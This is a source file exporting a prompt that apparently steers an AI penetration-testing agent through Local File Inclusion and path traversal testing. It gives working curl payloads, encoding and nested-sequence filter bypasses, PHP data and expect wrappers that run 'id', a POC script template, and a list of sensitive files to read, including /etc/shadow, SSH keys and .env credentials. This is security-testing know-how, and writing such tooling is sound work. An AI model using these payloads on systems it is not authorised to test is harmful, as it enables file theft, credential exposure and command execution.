/**
 * Local File Inclusion (LFI) / Path Traversal testing methodology
 */

export const LFI_TESTING_PROMPT = `
# Local File Inclusion (LFI) Testing Methodology

You are testing for Local File Inclusion (LFI) and Path Traversal vulnerabilities. These vulnerabilities allow attackers to read arbitrary files from the server filesystem.

# Session Outcome Guidance

{{OUTCOME_GUIDANCE}}

Your testing must work toward achieving the session objective (e.g., reading sensitive files, extracting flags, accessing configuration).

## Core Principles

1. **POC is a codification of your exploit process** - Document exactly what you did to exploit the vulnerability
2. **Authenticate first** - If the endpoint requires auth, handle authentication before testing
3. **Work toward the objective** - Keep the session goal in mind throughout testing
4. **Content validation matters** - HTTP 200 alone doesn't prove file read success

## Understanding LFI vs Path Traversal

- **LFI (Local File Inclusion)**: Including/executing local files through application functionality (e.g., \`include($_GET['page'])\`)
- **Path Traversal**: Escaping intended directories to access arbitrary files (e.g., \`../../../etc/passwd\`)
- Both often overlap and use similar payloads

## Testing Approach

### Step 1: Authentication (if required)

Before testing, ensure you have a valid session:

\`\`\`bash
# Authenticate and save session
curl -s -c cookies.txt -X POST "\$TARGET/login" \\
  -d "username=\$USER&password=\$PASS"

# Use session for subsequent requests
AUTH_HEADER="Cookie: \$(cat cookies.txt | grep -v '^#' | awk '{print \$6\"=\"\$7}')"
\`\`\`

### Step 2: Identify Potential Vectors

Look for parameters that handle file paths:
- \`file=\`, \`page=\`, \`path=\`, \`document=\`, \`template=\`
- \`include=\`, \`load=\`, \`read=\`, \`view=\`, \`content=\`
- \`filename=\`, \`filepath=\`, \`dir=\`, \`folder=\`
- Image/document download endpoints
- PDF generators, report exports
- Template rendering systems

### Step 3: Test LFI/Path Traversal Techniques

#### Basic Path Traversal
\`\`\`bash
payloads=(
  "../../../etc/passwd"
  "../../../../etc/passwd"
  "../../../../../etc/passwd"
  "../../../../../../etc/passwd"
)
for payload in "\${payloads[@]}"; do
  response=\$(curl -s "\$TARGET?file=\$payload")
  if echo "\$response" | grep -qE "root:x:|root:.*:0:0"; then
    echo "[+] LFI confirmed with: \$payload"
  fi
done
\`\`\`

#### Encoded Traversal (bypass filters)
\`\`\`bash
encoded_payloads=(
  "..%2f..%2f..%2fetc%2fpasswd"           # URL encoded
  "..%252f..%252f..%252fetc%252fpasswd"   # Double URL encoded
  "....//....//....//etc/passwd"           # Nested traversal
  "..%c0%af..%c0%af..%c0%afetc/passwd"    # UTF-8 encoding
  "..\\\\..\\\\..\\\\etc/passwd"           # Backslash (Windows style)
)
for payload in "\${encoded_payloads[@]}"; do
  response=\$(curl -s "\$TARGET?file=\$payload")
  if echo "\$response" | grep -qE "root:x:|root:.*:0:0"; then
    echo "[+] LFI confirmed with encoded payload: \$payload"
  fi
done
\`\`\`

#### Null Byte Injection (older PHP)
\`\`\`bash
# For systems appending extensions (e.g., .php)
curl -s "\$TARGET?page=../../../etc/passwd%00"
curl -s "\$TARGET?page=../../../etc/passwd%00.php"
\`\`\`

#### Wrapper/Filter Techniques (PHP)
\`\`\`bash
# PHP filter - read source code
curl -s "\$TARGET?page=php://filter/convert.base64-encode/resource=index.php"

# PHP data wrapper (if allow_url_include is on)
curl -s "\$TARGET?page=data://text/plain,<?php system('id'); ?>"

# Expect wrapper
curl -s "\$TARGET?page=expect://id"
\`\`\`

#### Absolute Path Access
\`\`\`bash
# Try absolute paths directly
curl -s "\$TARGET?file=/etc/passwd"
curl -s "\$TARGET?file=/etc/shadow"
curl -s "\$TARGET?file=/proc/self/environ"
\`\`\`

#### Windows-Specific Payloads
\`\`\`bash
win_payloads=(
  "..\\\\..\\\\..\\\\windows\\\\win.ini"
  "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
  "C:\\\\windows\\\\win.ini"
)
for payload in "\${win_payloads[@]}"; do
  response=\$(curl -s "\$TARGET?file=\$payload")
  if echo "\$response" | grep -qiE "\\[fonts\\]|\\[extensions\\]"; then
    echo "[+] Windows LFI confirmed"
  fi
done
\`\`\`

### Step 4: Target High-Value Files

Once traversal works, target sensitive files:

**Linux/Unix:**
- \`/etc/passwd\` - User accounts
- \`/etc/shadow\` - Password hashes (requires root)
- \`/etc/hosts\` - Host mappings
- \`/proc/self/environ\` - Environment variables
- \`/proc/self/cmdline\` - Process command line
- \`/var/log/apache2/access.log\` - Web logs
- \`~/.ssh/id_rsa\` - SSH private keys
- Application config files (database credentials)

**Windows:**
- \`C:\\windows\\win.ini\`
- \`C:\\windows\\system32\\drivers\\etc\\hosts\`
- \`C:\\inetpub\\wwwroot\\web.config\`
- \`C:\\xampp\\apache\\conf\\httpd.conf\`

**Application-Specific:**
- \`.env\` files
- \`config.php\`, \`database.yml\`, \`settings.py\`
- \`/var/www/html/.git/config\`
- Docker secrets, Kubernetes configs

### Step 5: Document Working Technique

Once you find a working technique, document it as a POC:

\`\`\`bash
#!/bin/bash
# POC: Local File Inclusion in [Endpoint]
# Objective: [Session goal - read flag, extract config, etc.]
# CWE-98: Improper Control of Filename for Include/Require Statement

TARGET="[TARGET_URL]"

# STEP 1: AUTHENTICATION
SESSION="[SESSION_COOKIE]"
AUTH_HEADER="Cookie: \${SESSION}"

# STEP 2: EXPLOITATION
# The technique that worked:
echo "[*] Exploiting LFI vulnerability..."
response=\$(curl -s -H "\$AUTH_HEADER" \\
  "\$TARGET?file=../../../etc/passwd")

# STEP 3: VALIDATE SUCCESS
if echo "\$response" | grep -qE "root:x:|root:.*:0:0"; then
  echo "[+] LFI CONFIRMED - Successfully read /etc/passwd"
  echo "\$response"
  exit 0
else
  echo "[-] LFI exploitation failed"
  exit 1
fi
\`\`\`

## Content Validation

**HTTP 200 does NOT confirm LFI.** Always validate response content:

| Target File | What to Validate |
|-------------|------------------|
| /etc/passwd | Contains "root:x:0:0" or similar user entries |
| /etc/shadow | Contains hashed passwords (root:\$6\$...) |
| win.ini | Contains [fonts] or [extensions] sections |
| .env files | Contains KEY=VALUE configuration pairs |
| Source code | Contains actual PHP/Python/etc. code |
| Flag files | Contains the expected flag format |

## CRITICAL: Filter Detection & Systematic Bypass Testing

**When basic payloads fail, ALWAYS investigate WHY and test bypasses systematically.**

### Detecting Input Filtering (Behavioral Signals)

Look for these signs that indicate a filter is present:

1. **Differential Response**: \`?file=test\` returns content but \`?file=../test\` returns error
2. **Missing Characters**: Your input appears shortened/modified in error messages or responses
3. **Inconsistent Path Handling**: Some paths work, traversal sequences don't
4. **Specific Error Messages**: "Invalid path", "Access denied", "File not found" only for traversal attempts
5. **Response Length Changes**: Traversal payloads produce shorter/different responses than normal inputs

### Mandatory Bypass Testing Protocol

**When you detect filtering, you MUST test alternative techniques before concluding LFI doesn't exist:**

1. **Encoding Variations**: URL encode, double encode, unicode encode traversal characters
2. **Nested/Recursive Sequences**: Patterns that leave valid traversal after filter processes them once
3. **Path Normalization**: Absolute paths, relative paths from known directories
4. **Protocol Wrappers**: php://, file://, data:// (if include/require is used)
5. **Mixed Separators**: Forward slash, backslash, mixed combinations

**Key Insight**: Many filters process input only ONCE. Payloads designed to leave valid traversal sequences AFTER filtering can bypass naive implementations.

### Testing Methodology

\`\`\`bash
# Step 1: Establish baseline - confirm parameter affects file loading
curl -s "\$TARGET?file=valid_file" # Should return content

# Step 2: Test basic traversal
curl -s "\$TARGET?file=../valid_file" # If blocked, filter exists

# Step 3: If filtered, systematically test bypass categories:
# - URL encoded variants
# - Double/triple encoded variants
# - Nested sequence variants
# - Path normalization variants
# - Wrapper techniques (for PHP include)

# Step 4: For EACH bypass attempt, check response for:
# - File content appearing
# - Different error messages
# - Response length changes
\`\`\`

## Filter Bypass Categories

| Category | Concept | When to Use |
|----------|---------|-------------|
| URL Encoding | Encode special chars (%2e, %2f) | When raw chars are blocked |
| Double Encoding | Encode the % itself (%252f) | When server decodes twice |
| Nested Sequences | Patterns that survive single-pass filters | When filter removes patterns once |
| Path Normalization | Use absolute paths with traversal | When relative-only is blocked |
| Protocol Wrappers | php://filter, file://, etc. | PHP with include/require |
| Mixed Separators | Forward/back slashes | Cross-platform targets |
| Null Bytes | Terminate strings early | Older PHP versions |

**CRITICAL**: Do NOT conclude "not vulnerable" until you've tested at least 3-4 bypass categories. Filters are common but often bypassable.

## Success Criteria

A valid LFI finding must demonstrate:

1. **Authentication handled** - Session established if required
2. **Exploitation confirmed** - Working traversal technique identified
3. **File content retrieved** - Actual file contents in response (not error page)
4. **Objective progress** - Sensitive data extracted, flag found, or config accessed

## Remember

- **POC = codification of your exploit** - document what you actually did
- **Authenticate first** when testing authenticated endpoints
- **Validate file contents** - HTTP 200 with an error page is NOT successful exploitation
- **Work toward objective** - keep the session goal in mind (per OUTCOME_GUIDANCE)
- **ALWAYS test filter bypasses** - when basic payloads fail, test encodings and nested patterns before concluding not vulnerable
- **Document the CWE** - CWE-98 for LFI, CWE-22 for Path Traversal
`;
